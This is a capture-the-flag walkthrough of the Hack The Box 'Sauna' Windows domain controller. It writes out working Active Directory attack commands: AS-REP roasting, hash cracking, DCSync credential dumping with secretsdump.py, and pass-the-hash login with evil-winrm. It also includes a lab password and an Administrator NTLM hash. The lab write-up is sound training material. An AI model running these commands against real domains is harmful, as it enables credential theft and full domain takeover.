Sauna is an easy windows box that nicely showcases some common windows active directory misconfigurations and attack vectors such as AS-REP Roasting, Autologin credentials and abusing DC Sync privileges.


## Enumeration
As usual, we start by enumerating active services on the box using nmap

```
nmap -p- -sC -sV 10.10.10.175
```

``` 
-p- all ports
-sC run default scripts
-sV enumerate service versions
```

![Nmap]({{site.url}}/assets/CTF/HTB-Sauna/nmap.png)

Based on the enumerated ports, in particular 88 (Kerberos) and 389 (ldap), this instantly looks like a domain controller and therefore gives some insight into what attack vectors may be present. It is worth noting that by running default scripts (-sC) the Domain ‘EGOTISTICAL-BANK’ was automatically enumerated from LDAP, this may come in handy later.

In terms of priority it makes sense to start initially with SMB (445) - to see if we can null session authenticate to the service, then move onto http port 80.


### SMB
```
smbclient -L 10.10.10.175 -N
```
```
-L  list
-N  no password
```
![SMBClient]({{site.url}}/assets/CTF/HTB-Sauna/SMBClient.png)

So nothing there.

### HTTP

![HTTP]({{site.url}}/assets/CTF/HTB-Sauna/HTTP.png)

A quick bit of enumeration of this didn’t reveal anything obvious - also kicked off gobuster in the background but didn’t uncover anything obvious.

Potential users were found based on some manual enumeration of the website.

![HTTP2]({{site.url}}/assets/CTF/HTB-Sauna/HTTP2.png)

Using this information, a list of potential users was drawn up.

![userlist]({{site.url}}/assets/CTF/HTB-Sauna/userlist.png)


## Path to User

This user list can be used in conjunction with the enumerated domain from earlier to check for any kerberos accounts that don’t require kerberos preauthentication – AESRoasting.

```
GetNPUsers.py EGOTISTICALBANK/ -usersfile users.txt -format john -outputfile hashes.asreproast -no-pass -dc-ip 10.10.10.175
```

![GETNPUsers]({{site.url}}/assets/CTF/HTB-Sauna/GETNPUsers.png)

So we now have a hash for the FSmith user. 

This can be cracked using John. 

```
john hashes.asreproast --wordlist=/usr/share/wordlists/rockyou.txt 
```

![john]({{site.url}}/assets/CTF/HTB-Sauna/john.png)


We can now use these credentials to connect via Evil-WinRM and grab the user flag.

![user]({{site.url}}/assets/CTF/HTB-Sauna/user.png)

## Path to Root

Next step was to upload and execute [winpeas]( https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) to identify any low hanging privesc routes.

![autologon]({{site.url}}/assets/CTF/HTB-Sauna/autologon.png)

So we have some autologon credentials for another user, though interesting looking at the user home directories there is no ‘svc_loanmanager’ user, just a ‘svc_loanmgr’.

Was able to connect to box as svc_loanmgr using the autologon credentials.

![svc_loanmgr]({{site.url}}/assets/CTF/HTB-Sauna/svc_loanmgr.png)

As this is clearly a domain based machine, the next step was to upload and execute sharp hound to see what paths to the Administrator user exist.

I had a few issues getting sharp hound to fire locally or through the powershell injestor script - so in the end I utilised bloodhound-python remotely, which is a little cleaner anyway.

```
bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All
```

![bloodhound-python]({{site.url}}/assets/CTF/HTB-Sauna/bloodhound-python.png)


Looking at what special permissions the user svc_loanmanager has we can see it has both the ‘GetChanges’ and ‘GetChangesAll’ privileges.

![bloodhound]({{site.url}}/assets/CTF/HTB-Sauna/bloodhound.png)

Per bloodhound help – ‘If a user account has both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz’.

Rather than worrying about utilising mimikatz, we can just use impackets secretdump.py instead to do everything remotely.

```
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
```

![secretsdump]({{site.url}}/assets/CTF/HTB-Sauna/secretsdump.png)

Now we have an administrator NTLM hash we could try and crack it, or we can simply ‘pass the hash’ in order to authenticate via evil-winrm and grab the root flag.

```
evil-winrm -i 10.10.10.175 -u Administrator -H 'd9485863c1e9e05851aa40cbb4ab9dff'
```
